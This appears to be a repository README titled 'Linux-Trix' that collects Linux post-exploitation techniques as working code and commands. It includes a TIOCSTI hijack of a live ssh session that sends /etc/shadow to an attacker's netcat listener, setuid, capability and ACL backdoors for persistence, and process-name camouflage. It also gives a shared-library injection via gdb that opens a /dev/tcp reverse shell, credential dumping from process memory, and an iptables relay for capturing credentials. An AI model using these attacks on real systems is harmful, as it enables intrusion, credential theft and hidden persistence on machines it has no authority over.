# Linux-Trix
An assortment of techniques that can be used to exploit Linux.  These are uncommon exploits that are not often used.  Most of these assume that you have or can attain root privileges on the host.  You will need to change IP addresses and other references in the examples to fit your environment.

## >> Stuffing commands into an existing ssh session

**This example assumes the following**<br />
* The attacking Linux machine (A) is 192.168.1.7
* The victim Linux machine (B) is 192.168.1.5
* The remote host (C) that a user on (B) has an ssh session open to is 192.168.10.10

**You have aquired root on a target (B), check for active ssh client sessions to other remote hosts**<br />
`ps -ef | grep ssh | grep @`

Example output, you see user "bill" on "pts/1" connected to a remote host (C) as "root".<br />
`bill     18953 18855  0 08:42 pts/1    00:00:00 ssh root@192.168.10.10`

Compile the following C code on (B) as `ptshijack.c` to get `/etc/shadow` from (C).<br />
```c
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>

// gcc ptshijack.c -o ptshijack

int main()
{
   int fd = open("/dev/pts/1", O_RDWR);
   if(fd < 0)
   {
      perror("open");
      return -1;
   }
   // your commands to execute go here.
   char *x = "(cat /etc/shadow | nc 192.168.1.7 4444) &\nhistory -c\nclear\n";
   while(*x != 0)
   {
      int ret = ioctl(fd, TIOCSTI, x);
      if(ret == -1)
      {
         perror("ioctl()");
      }
      x++;
   }
   return 0;
}
```

**Start netcat on (A) to receive** `/etc/shadow` **from (C)**<br />
```nc -nlvp 4444```

**Execute** `ptshijack` **on (B) to send** `/etc/shadow` **from (C) to (A)**<br />
SIGINT (ctrl-c) netcat on (A) to terminate the background process on (C)<br />

## >> Persistence with setuid, capabilities and ACLs

Once you have root on a system leave these behind to exploit later:

**(setuid)**<br />
* `chmod u+s /usr/bin/chmod` and `chmod u+s /usr/bin/chown`, will allow you to create files as an ordinary user that execute as root.
* `chmod u+s /usr/bin/cat` will allow you to view `/etc/shadow` as an ordinary user.
* Or discreetly `cp /bin/cat /bin/.cat` then `chmod u+s /bin/.cat` then as user `.cat /etc/shadow`
* Compile the following C program as a hidden binary and setuid as root.<br />
```c
// gcc -o .setuid-shell setuid-shell.c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <grp.h>

int main(int argc, char **argv)
{
   initgroups("root", 0);
   setgid(0);
   setuid(0);
   execve("/bin/bash", NULL, NULL);

   return 0;
}
```
setuid as root `chown root:root .setuid-shell` then `chmod u+s .setuid-shell`<br />
Now execute `.setuid-shell` and see that you are root by issuing the `id` command.

**(capabilities)**<br />
* Compile the C program above as an ordinary user.<br />
* As root, `setcap cap_setuid=eip /home/myuser/setuid-shell`<br />
* As the user, execute `setuid-shell` then `id` to see that you are root.

Allow non-root user to execute `tcpdump` so insecure protocols can be captured.

* As root, `setcap cap_net_raw=eip /usr/sbin/tcpdump`<br />
* As the user, execute `tcpdump -nn -vv -X -i eth0 port 23`<br />
Example of removing capabilities `setcap -r /usr/sbin/tcpdump`<br />
Example of listing capabilities `getcap /usr/sbin/tcpdump`

**(ACLs)**<br />
* As root, `setfacl -m u:myuser:rw /etc/shadow`<br />
* Execute `getfacl /etc/shadow` will show `user:myuser:rw-` and `ls -l /etc/shadow` will show `-rw-rw----+`<br />
* As the user, execute `cat /etc/shadow` to see the contents of the file.<br />
* To remove a specific ACL, execute `setfacl -x u:myuser /etc/shadow`<br />
* To remove all ACLs, execute `setfacl -b /etc/shadow`

## >> Changing the process name in ps

This example shows how to camouflage a process name shown by the `ps` command.<br />
Create program source named `hidden.c`.<br />
```c
#include <string.h>
#include <unistd.h>

int main(int argc, char **argv)
{
   char *fakename = "init"; // ensure that the program name is long enough to hold fakename
   memcpy(argv[0], fakename, strlen(fakename));
   memset(argv[0] + strlen(fakename), 0, strlen(argv[0]) - strlen(fakename));
   sleep(120);
   return -1;
}
```
Compile `gcc -o hidden hidden.c` and execute `./hidden`<br />
The `ps` command should show the process name as `init`.

## >> Injecting a shared object into a running process to get a reverse shell

This technique will dynamically load a library (.so file) into an existing process to get a reverse shell as the user the process is running as.<br />
The attacker IP in this example is 192.168.1.19 and will be listening on port 4444 for the reverse shell.<br />
`nc -nlvp 4444`

**Compile the following C program**<br />
`gcc -O2 -fPIC -o libcallback.so ./libcallback.c -lpthread -shared`<br />
```c
#include <pthread.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

/*
   (compile)
   gcc -O2 -fPIC -o libcallback.so ./libcallback.c -lpthread -shared
   (copy)
   cp ./libcallback.so /tmp/libcallback.so
*/

// callback reverse shell destination
#define RVSADDR "192.168.1.19"
#define RVSPORT "4444"

// reverse shell command
#define COMMAND "echo 'exec >& /dev/tcp/" RVSADDR "/" RVSPORT " 0>&1' | nohup /bin/bash >/dev/null 2>&1 &"

void *callback(void *a);

__attribute__((constructor))
void start_callbacks()
{
   pthread_t tid;
   pthread_attr_t attr;

   if(pthread_attr_init(&attr) == -1)
   {
      return;
   }
   if(pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED) == -1)
   {
      return;
   }
   pthread_create(&tid, &attr, callback, NULL);
}

void *callback(void *a)
{
   system(COMMAND);
   return NULL;
}
```
**Copy the library file to the /tmp directory**<br />
`cp ./libcallback.so /tmp/libcallback.so`

**Find the PID of a target process to inject the library into**<br />
(e.g. PID selected is 2739) Some systems allow non-root users to debug their own processes.<br />
`echo 'print __libc_dlopen_mode("/tmp/libcallback.so", 2)' | gdb -p 2739`

You should see a connection to your netcat session listening on port 4444.  You should not lose your shell even if the parent process exits.

## >> Dumping creds from the stack and heap of a running process

This example will attack snmpwalk to get the community string.<br>
**Temporarily suspend the snmpwalk process**<br />
`SNMPPID=$(ps -ef | grep snmpwalk | grep -v grep | tr -s " " | cut -d " " -f 2); kill -STOP $SNMPPID`

**Get the PID of the snmpwalk process**<br />
`ps -ef | grep snmpwalk`
You will notice that the community string has been scrubbed from the argument list.

**Use the PID to view** `proc` **filesystem data**<br />
`cat /proc/<PID>/environ` (This is just standard procedure, you may find some good stuff here)<br />
`cat /proc/<PID>/cmdline` (This is just standard procedure, you may find some good stuff here)<br />
Get the `[stack]` and `[heap]` memory ranges.<br />
`cat /proc/<PID>/maps`<br />
(e.g. note the memory ranges)<br />
```
7fffa3f44000-7fffa3f59000 rwxp 7ffffffe9000 00:00 0       [stack]
557389846000-557389867000 rw-p 00000000 00:00 0           [heap]
```
**Use the PID with gdb to save stack and heap memory to files**<br />
```
gdb
attach <PID>
dump memory /tmp/snmpwalk.stack.bin 0x7fffa3f44000 0x7fffa3f59000
dump memory /tmp/snmpwalk.heap.bin 0x557389846000 0x557389867000
detach
quit
```
**Resume the snmpwalk process**<br />
`SNMPPID=$(ps -ef | grep snmpwalk | grep -v grep | tr -s " " | cut -d " " -f 2); kill -CONT $SNMPPID`

**scan the output files for both ASCII and unicode strings**<br />
(hint ... the community string is stored in the heap)<br />
`strings /tmp/snmpwalk.stack.bin | more`<br />
`strings -e l /tmp/snmpwalk.stack.bin | more`<br />
`strings /tmp/snmpwalk.heap.bin | more`<br />
`strings -e l /tmp/snmpwalk.heap.bin | more`<br />

## >> Protocol pass-back attacks

This technique is useful for relaying protocols such as LDAP, SMTP, HTTP, and SMB from a compromised victim machine.  Your attacking machine will forward traffic to the intended host and capture credentials and files that can be reconstituted from a cap file.  You may have to temporarily reconfigure the service/application destination IP or hosts file on the victim to intercept traffic.<br />
**This example assumes the following**<br />
* The attacking Linux machine (A) is 192.168.1.7 using eth0
* The victim machine (B) is 192.168.10.5
* The remote host (C) that a service on (B) normally connects to is 192.168.100.30

**Set up routing and iptables on the attacking machine (A)**<br />
Change the port as appropriate for the protocol being intercepted, LDAP port 389 shown.<br />
`echo 1 > /proc/sys/net/ipv4/conf/eth0/forwarding`<br />
`iptables -t nat -A PREROUTING -p tcp -i eth0 --dport 389 -j DNAT --to-destination 192.168.100.30:389`<br />
`iptables -A FORWARD -p tcp -i eth0 -d 192.168.100.30 --dport 389 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT`<br />
`iptables -t nat -A POSTROUTING --destination 192.168.100.30/32 -j SNAT --to-source 192.168.1.7`<br />
`tcpdump -nn -vv -i eth0 -s 0 -w victim.ldap.cap port 389`

**You have aquired sufficient privileges on a target (B)**<br />
Change the service or edit the hosts file to relay traffic to the IP address of your attacking machine (e.g. 192.168.1.7).

**Claim your prize**<br />
Once you have a capture file (e.g. victim.ldap.cap) you can open it in WireShark or NetworkMiner to retrieve credentials, files, cookies, etc that are useful.  Revert the destination IP or hosts file back to normal on victim (B).

## >> Stacking busybox for increased functionality

Busybox is a multi-call binary that acts as a substitute for discrete programs normally available in a Linux shell.  Instead of installing separate programs (e.g. cat, echo, ls, pwd, ...) busybox allows applets to be invoked as arguments.  However, you may find that sometimes the running instance of busybox is limited in its set of available commands.  If the device you are accessing has space in the `/tmp` folder and busybox supports the `curl` or `wget` commands and has `chmod` capabilities you should be able to download a copy of busybox for the specific processor architecture and acquire functionality that was not previously available.

For example, you have access to an IOT device based on the MIPS processor architecture.  You find that it has netcat but does not support listening sockets.  Download a copy of busybox that supports `nc -l`.

`curl -k https://busybox.net/downloads/binaries/1.19.0/busybox-mips > /tmp/busybox`

Mark the file as executable.<br />
`chmod +x /tmp/busybox`

Execute your netcat listener.<br />
`/tmp/busybox nc -l -p 4444`

As another example, you have access to a device based on the ARMv7 processor architecture.  You find that it supports the `tftp` client but you need `tftpd` which is not present.

Assume that DNS name resolution is not configured on the device.  Perform the following.<br />
`echo "nameserver 8.8.8.8" >> /etc/resolv.conf`

Download a copy of busybox that supports `tftpd`.<br />
`wget --no-check-certificate -O - https://busybox.net/downloads/binaries/1.21.1/busybox-armv7l > /tmp/busybox`

Mark the file as executable.<br />
`chmod +x /tmp/busybox`

Launch the tftp server.<br />
`/tmp/busybox udpsvd -vE 0.0.0.0 69 /tmp/busybox tftpd -c -u ubnt /tmp`
